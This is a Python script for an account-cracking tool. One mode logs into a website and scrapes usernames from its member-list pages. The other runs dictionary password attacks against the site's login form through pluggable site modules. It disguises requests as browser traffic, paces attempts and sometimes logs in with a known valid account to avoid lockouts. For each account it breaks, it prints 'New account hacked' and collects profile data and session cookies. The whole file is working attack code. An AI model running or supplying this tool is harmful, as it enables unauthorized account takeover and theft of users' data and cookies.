import requests, re, time, random, os
from importlib.machinery import SourceFileLoader

def parse():
    session = requests.Session()

    session.headers = {
        'Cache-Control': 'max-age=0',
        'Referer': 'https://google.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
    }

    if module.needToLogin:
        login, password = module.valid_pair

        fields = module.otherFields
        fields.update({
            module.loginFields['login']: login,
            module.loginFields['password']: password
        })

    session.headers['Referer'] = module.loginPage
    session.post(module.loginPage, fields)
    session.headers['Referer'] = 'https://google.com/'

    if isinstance(module.getPage, type(None)): module.getPage = lambda x: x

    if isinstance(module.pageNum, type(None)):
        module.pageNum = int(re.search(module.pageNRegex, session.get(module.usersPage % module.getPage(0)).text).group(1))

    for i in range(module.pageNum):
        print('Pages parsed: %d/%d' % (i, module.pageNum))

        text = session.get(module.usersPage % module.getPage(i)).text
        if not isinstance(module.changeText, type(None)): text = module.changeText(text)

        users = re.findall(module.usersRegex, text)
        open(outputFile, mode = 'a', encoding = 'utf-8').write('\n'.join(users))

def checkPair(login, password):
    session = requests.Session()

    session.headers = {
        'Cache-Control': 'max-age=0',
        'Referer': module.loginPage,
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
    }

    fields = module.otherFields
    fields.update({
        module.loginFields['login']: login,
        module.loginFields['password']: password
    })

    session.post(module.loginPage, fields)

    if login not in module.valid_pairs.keys() and module.isValid(session):
        data = {'isValid': True}

        for page in module.extract['from_pages']:
            response = session.get(page['page']).text

            for field in page['fields']:
                fieldName, regex, func = field
                info = re.search(regex, response)

                if not isinstance(info, type(None)):
                    info = info.group(1)
                    if not isinstance(func, type(None)):
                        info = func(info)

                data[fieldName] = info

        for fieldName, cookieName, func in module.extract['from_cookies']:
            info = dict(session.cookies)[cookieName]
            if not isinstance(func, type(None)): info = func(info)

            data[fieldName] = info

        return data
    else: return {'isValid': False}

def brute():
    global counter

    for login in logins:
        if login not in module.valid_pairs.keys():
            open(loggerFile, mode = 'a', encoding = 'utf-8').write('Bruting password of %s\n' % login)
            print('    Bruting password of %s' % login)

            for password in passes + [login, login[::-1]]:
                if counter % module.maxAttempts == 0:
                    checkPair(*random.choice(list(module.valid_pairs.items())))

                counter += 1
                time.sleep(module.delay)
                result = checkPair(login, password)
                
                if result['isValid']:
                    result = [('login', login), ('password', password)] + sorted(list(result.items()), key = lambda x: x[0])

                    open(outputFile, mode = 'a').write(', '.join('%s: %s' % field for field in result if field[0] != 'isValid') + '\n')
                    print('[New account hacked] %s : %s' % (login, password))
                    module.valid_pairs[login] = password

                    break

while True:
    choice = input('Choose action [parse / brute]: ')

    if choice == 'brute':
        while True:
            modules = [module[:-3] for module in os.listdir('./bruteforce_modules') if module.endswith('.py')]
            module  = input('Choose module (%s): ' % ', '.join(modules))

            if module in modules: break
            print('Incorrect module name! Please, try again!')

        module = SourceFileLoader('module', 'bruteforce_modules/%s.py' % module).load_module()

        loginsList = input('\nEnter filename with usernames: ')
        passesList = input('Enter filename with passwords: ')
        outputFile = input('Enter filename for correct pairs: ')
        loggerFile = input('Enter filename for logs: ')

        logins = open(loginsList, mode = 'r', encoding = 'utf-8').readlines()
        passes = open(passesList, mode = 'r').readlines()

        logins = [login.strip() for login in logins]
        passes = [passwd.strip() for passwd in passes]

        open(outputFile, mode = 'a').write('=' * 80 + '\n')

        counter = 1

        brute()
        print('Bruting completed!'); break
    if choice == 'parse':
        while True:
            modules = [module[:-3] for module in os.listdir('./parse_modules') if module.endswith('.py')]
            module  = input('Choose module (%s): ' % ', '.join(modules))

            if module in modules: break
            print('Incorrect module name! Please, try again!')
        
        module = SourceFileLoader('module', 'parse_modules/%s.py' % module).load_module()
        
        outputFile = input('Enter name of output file: ')
        
        parse()
        print('Parsing completed!'); break

    print('Incorrect action! Please, try again!')
